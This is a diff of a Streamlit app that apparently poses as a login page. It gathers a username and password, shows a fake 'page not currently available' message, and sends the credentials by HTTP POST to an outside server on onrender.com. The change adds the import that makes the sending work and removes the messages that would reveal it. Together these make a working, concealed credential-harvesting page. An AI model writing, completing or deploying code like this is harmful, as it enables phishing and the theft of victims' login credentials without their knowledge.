@@ -1,4 +1,5 @@
 import streamlit as st
+import requests
 
 username = ""
 password = ""
@@ -26,8 +27,3 @@ with middle:
        st.write("Sorry this page is not currently Available")
        data = {"username": username, "password": password}
        response = requests.post("https://receiver-t4vh.onrender.com", data=data)
-
-    if response.status_code == 200:
-            st.success("Data sent successfully!")
-    else:
-            st.error("Error sending data.")
